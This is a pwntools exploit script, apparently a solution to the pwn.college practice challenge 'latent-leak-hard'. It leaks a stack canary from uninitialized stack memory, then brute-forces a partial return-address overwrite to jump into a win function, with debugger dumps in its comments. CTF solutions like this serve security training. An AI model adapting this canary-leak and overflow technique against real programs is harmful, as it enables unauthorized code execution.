from pwn import *
import random

'''
input buffer at: rbp - 0x190
cause print("%.378s") that we can not leak canary directly.

when we debug it dynamic, we search the canary at the stack, there is two canary at stack!
pwndbg> dq $rsp 80
00007ffc104742e0     0000000000000000 00007ffc104755f8
00007ffc104742f0     00007ffc104755e8 0000000100000000
00007ffc10474300     0000000000000000 0000000000000000
00007ffc10474310     0000000000000463 00007ffc10474320
00007ffc10474320     0000000000000000 0000000000000000
00007ffc10474330     0000000000000000 0000000000000000
00007ffc10474340     0000000000000000 0000000000000000
00007ffc10474350     0000000000000000 0000000000000000
00007ffc10474360     0000000000000000 0000000000000000
00007ffc10474370     0000000000000000 0000000000000000
00007ffc10474380     0000000000000000 00007e0543ef0193
00007ffc10474390     000000006ffffdff 62bdcf5243733600 <- cookie here!
00007ffc104743a0     00007e0543ed3000 000061eb5c477bf0
00007ffc104743b0     000061eb5c477200 00007ffc104755e0
00007ffc104743c0     0000000000000000 0000000000000000
00007ffc104743d0     00007ffc104754f0 00007e0543d42d3f
00007ffc104743e0     0000003000000010 00007ffc104744c0
00007ffc104743f0     00007ffc10474400 00007e0543d6fe8d
00007ffc10474400     00000000001be6a0 00007e0543ece6a0
00007ffc10474410     0000000000000001 00007e0543ece723
00007ffc10474420     0000000000000d68 00007e0543d71951
00007ffc10474430     0000000000000d68 000000000000000a
00007ffc10474440     00007e0543ece6a0 000061eb5c47a020
00007ffc10474450     00007e0543ed4540 0000000000000000
00007ffc10474460     0000000000000000 00007e0543d71e93
00007ffc10474470     00007e0543ece6a0 000000000000000a
00007ffc10474480     000061eb5c47a020 00007e0543d67302
00007ffc10474490     000061eb5c477bf0 000061eb5c477bf0
00007ffc104744a0     00007ffc104754f0 62bdcf5243733600 <- canary
00007ffc104744b0     00007ffc104754f0 000061eb5c477bc4

and this cookie canary always here every time!

we can invesgate the stack when it not uninitialize. (memset or calloc)
'''
if args.LOCAL:
    context.binary = elf = ELF('./latent-leak-hard')
else:
    context.binary = elf = ELF('/challenge/latent-leak-hard')

canary_buffer_offset = 120
backdoor_trigger = b'REPEAT'
orig_canary_buffer_offset = 0x188
sip_buffer_offset = 0x198

'''
win_authed fourth nibble guess:
Dump of assembler code for function win_authed:
   0x0000000000001861 <+0>:     endbr64
   0x0000000000001865 <+4>:     push   rbp
   0x0000000000001866 <+5>:     mov    rbp,rsp
   0x0000000000001869 <+8>:     sub    rsp,0x10
   0x000000000000186d <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x0000000000001870 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
   0x0000000000001877 <+22>:    jne    0x197b <win_authed+282>
   0x000000000000187d <+28>:    lea    rdi,[rip+0x784]        # 0x2008
   0x0000000000001884 <+35>:    call   0x1140 <puts@plt>
'''
fixed_byte = b'\x7d'
guess_byte = [bytes([i]) for i in range(0x8, 0x108, 0x10)]

while True:
    io = elf.process()

    io.sendline(str(canary_buffer_offset + 1).encode())
    io.sendline(backdoor_trigger + b'A' * (canary_buffer_offset + 1 - len(backdoor_trigger)))

    io.recvuntil(b'A' * (canary_buffer_offset + 1 - len(backdoor_trigger)))
    canary = u64(io.recvn(7).rjust(8, b'\x00'))
    print(f'[+] canary: {hex(canary)}')

    io.sendline(str(sip_buffer_offset + 2))
    io.sendline(b'A' * orig_canary_buffer_offset + p64(canary) + b'B' * 8 + fixed_byte + random.choice(guess_byte))

    response = io.recvall()

    if b'pwn.college' in response:
        print(response.decode())
        exit()

